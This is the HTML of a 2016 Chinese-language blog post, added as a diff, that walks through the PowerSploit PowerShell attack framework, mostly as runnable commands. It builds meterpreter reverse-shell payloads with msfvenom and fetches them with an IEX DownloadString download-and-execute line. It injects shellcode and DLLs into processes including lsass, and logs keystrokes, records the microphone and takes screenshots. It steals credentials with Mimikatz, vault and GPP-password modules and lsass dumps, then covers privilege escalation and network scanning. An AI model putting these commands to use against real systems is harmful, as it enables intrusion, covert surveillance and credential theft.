@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="powershell 渗透框架 [PowerSploit]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>powershell 渗透框架 [PowerSploit] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/10/06/powersploit/">
+                powershell 渗透框架 [PowerSploit]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-10-06</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/powershell/">powershell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;和nishang一样,PowerSploit也是一款非常实用的powershell渗透框架,下面就其用法做些简要说明<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted 还是一样,先放开脚本执行限制,实际渗透中自己bypass一下就好了</div></pre></td></tr></table></figure></p>
+<p>0x02 命令执行类模块 [CodeExecution]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Invoke-Shellcode.ps1 向指定进程中注入我们的shellcode,我们可以通过这种方式弹回一个meterpreter,注意shellcode系统位数版本要跟目标的系统一致才行,另外,权限务够也是必须的</div><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=1234 -f powershell -o /root/Desktop/shell.txt</span></div><div class="line"><span class="comment"># msfconsole 监听刚才的payload配置</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p><img src="/img/invoke shellcode.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">可以看到,当我们注入自己的payload之后meterpreter被正常弹回</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\CodeExecution\Invoke-Shellcode.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; IEX (New-Object Net.WebClient).DownloadString(<span class="string">'http://192.168.3.6/shell.txt'</span>)</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-Shellcode -Shellcode @($buf) -ProcessId <span class="number">6284</span></div></pre></td></tr></table></figure>
+<p><img src="/img/invoke shellcode res.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Invoke-WmiCommand.ps1  适用于批量在远程机器上执行系统指令,暂时还有些问题</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\CodeExecution\Invoke-WmiCommand.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; $Hosts = Get-Content <span class="symbol">C:</span>\host.txt</div><div class="line">PS <span class="symbol">C:</span>\&gt; $Payload = Get-Content <span class="symbol">C:</span>\shell.ps1  问题就在这个payload上</div><div class="line">PS <span class="symbol">C:</span>\&gt; $Credential = Get-Credential <span class="string">'TargetDomain\TargetUser'</span> 指定账号,它会提示你输入密码</div><div class="line">PS <span class="symbol">C:</span>\&gt; $Hosts <span class="params">| Invoke-WmiCommand -Payload $Payload -Credential $Credential</span></div></pre></td></tr></table></figure>
+<p><img src="/img/invoke wmicommand.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Invoke-DllInjection.ps1 将自己的dll注入到目标机器的指定进程中,务必以administrator或者system权限操作,这里就一个弹回以meterpreter为例</div><div class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.3.6 LPORT=1234 -f dll -o /root/Desktop/shell.dll</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lport <span class="number">1234</span></div><div class="line">msf exploit(handler) &gt; set lhost <span class="number">192.168</span>.<span class="number">3.6</span></div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\CodeExecution\Invoke-DllInjection.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-DllInjection -ProcessID <span class="number">5560</span> -Dll shell.dll 这里的<span class="number">5560</span>是explorer.exe的进程id,最好不要注入到这个进程里,容易把资源管理器搞崩溃</div></pre></td></tr></table></figure>
+<p><img src="/img/invoke dllinjection.jpg" alt=""><br><img src="/img/invoke dllinjection res.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Invoke-ReflectivePEInjection.ps1 	远程注入dll,同样,也有些问题</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\CodeExecution\Invoke-ReflectivePEInjection.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; $PEBytes = [IO.File]<span class="symbol">:</span><span class="symbol">:ReadAllBytes</span>(<span class="string">'c:\shell.dll'</span>)</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName <span class="number">2008</span>R2DC</div></pre></td></tr></table></figure>
+<p><br></p>
+<p>0x03 各种信息搜集模块 [Exfiltration]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">截屏 </div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-TimedScreenshot.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-TimedScreenshot -Path <span class="symbol">c:</span>\temp\ -Interval <span class="number">5</span> -EndTime <span class="number">11</span><span class="symbol">:</span><span class="number">23</span>  每<span class="number">5</span>秒截一次图,到<span class="number">11</span><span class="symbol">:</span><span class="number">23</span>时结束</div></pre></td></tr></table></figure></p>
+<p><img src="/img/get timedscreenshot.jpg" alt=""><br><img src="/img/get timedscreenshot res.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">键盘记录,如果是直接用弹回来的meterpreter再开的cmd[shell],直接在那里面用bypass选项执行脚本不太好使</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-Keystrokes.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-Keystrokes -LogPath <span class="symbol">C:</span>\temp\key.log -Timeout <span class="number">2</span>  记录<span class="number">2</span>分钟</div></pre></td></tr></table></figure>
+<p><img src="/img/get keystrokes.jpg" alt=""><br><img src="/img/get keystrokes res.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">抓取Windows vault 中保存的各种密码</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-VaultCredential.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-VaultCredential</div></pre></td></tr></table></figure>
+<p><img src="/img/get vaultscredential.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">在域控中查找 registry.xml文件中的自动登录信息[账号密码],还有些问题</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-GPPAutologon.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-GPPAutolgon</div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">同上,在域控中搜索groups.xml,scheduledtasks.xml,services.xml和datasources.xml文件中的明文账户密码</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-GPPPassword.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-GPPPassword -Server rootkit.org</div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">利用目标机器的麦克风进行录音,然后存到把音频文件存到指定的路径下,当然,前提是目标外设必须要有麦克风才行,这个对个人机会很有用</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Get-MicrophoneAudio.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-MicrophoneAudio -Path <span class="symbol">c:</span>\temp\secret.wav -Length <span class="number">10</span> -Alias <span class="string">"tokesn"</span>  录制<span class="number">10</span>秒,然后放到<span class="symbol">c:</span>\temp目录下</div></pre></td></tr></table></figure>
+<p><img src="/img/Get-MicrophoneAudio.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Invoke-TokenManipulation.ps1通常配合Invoke-CredentialInjection.ps1一起使用,一个用来窃取令牌另一个用来注入该令牌</div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">powershell版的mimikatz套件,大家都已经非常熟悉了,这里就不细说了</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Invoke-Mimikatz.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-Mimikatz -Command <span class="string">"privilege::debug sekurlsa::logonpasswords exit"</span> 抓取系统本地的用户密码明文及hash</div></pre></td></tr></table></figure>
+<p><img src="/img/invoke-mimikatz.jpg" alt=""><br><img src="/img/invoke-mimikatz res.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">导出进程数据,免杀抓hash,跟prodump -ma的功能基本一致,想必大家早已经用烂了</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\Out-Minidump.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-Process lsass <span class="params">| Out-Minidump -DumpFilePath C:\temp</span></div></pre></td></tr></table></figure>
+<p><img src="/img/out-minidump.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">powershell版的shadowcopy,接下来去里面拷你想拷的文件就好了</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Exfiltration\VolumeShadowCopyTools.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; New-VolumeShadowCopy -Volume <span class="symbol">C:</span>\  表示你想对那个分区执行shadowcopy操作</div></pre></td></tr></table></figure>
+<p><br></p>
+<p>0x04 提权相关的一些模块 [Privesc]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">将当前线程令牌提到system</div><div class="line"><span class="symbol">C:</span>\&gt;powershell -sta   这里必须要以sta模式运行powershell</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Privesc\Get-System.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Get-System</div></pre></td></tr></table></figure></p>
+<p><img src="/img/Get-System.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">执行提权的各种检查,要检查的内容比较多,如,可执行文件权限,服务运行权限,检查可被劫持的dll位置,检查AlwaysInstallElevated[非授权用户已system运行msi],其它各种可以被利用的注册表项,以及能搜到的各种密码等等……,可直接把检查的结果重定向到指定文件中,对于win提权来讲,绝逼好用,后续有时间我们再单独把它拿出来说</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Privesc\PowerUp.ps1 </div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-AllChecks <span class="params">| Out-File pri_info.txt</span></div></pre></td></tr></table></figure>
+<p><br></p>
+<p>0x05 内网信息搜集的一些小模块 [Recon]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">端口扫描,结果可能比较多可以选择把它重定向到指定的文件中,速度虽然不算太快,但也不慢,精度还可以,不过,比用什么专业的端口扫描机器要靠谱多了</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Recon\Invoke-Portscan.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-Portscan -Hosts <span class="number">192.168</span>.<span class="number">3.0</span>/<span class="number">24</span> -T <span class="number">4</span> -Ports <span class="string">"21,22,23,80,1433,1521,3306,3389"</span> <span class="params">| Out-File port_info.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/invoke portscan.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">dns反向解析[其实类似于ip反查],由ip查出所对应的域名,对于定位内网指定机器会很好用</div><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module <span class="symbol">C:</span>\PowerSploit\Recon\Invoke-ReverseDnsLookup.ps1 </div><div class="line">PS <span class="symbol">C:</span>\&gt; Invoke-ReverseDnsLookup <span class="string">'192.168.3.20-192.168.3.24'</span></div></pre></td></tr></table></figure>
+<p><img src="/img/invoke reversednslookup.jpg" alt=""></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">一样还是通过这种方式,我们可以直接把整个网段存活机器所对应的机器名都跑出来,在域中无疑非常方便,比单纯的net view&amp;批处理还会更好一些</div><div class="line">PS <span class="symbol">C:</span>\&gt; Write-Output <span class="string">"192.168.3.0/24"</span> <span class="params">| Invoke-ReverseDnsLookup</span></div></pre></td></tr></table></figure>
+<p>0x06 最后,还有一些辅助性的模块<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Out-CompressedDll.ps1   编码并压缩指定的dll</div><div class="line">Out-EncodedCommand.ps1  对ps进行编码</div><div class="line">Out-EncryptedScript.ps1 加密脚本,可以用它来给脚本设置密码[可带盐]</div></pre></td></tr></table></figure></p>
+<p><br></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/PowerSploit/">#PowerSploit</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
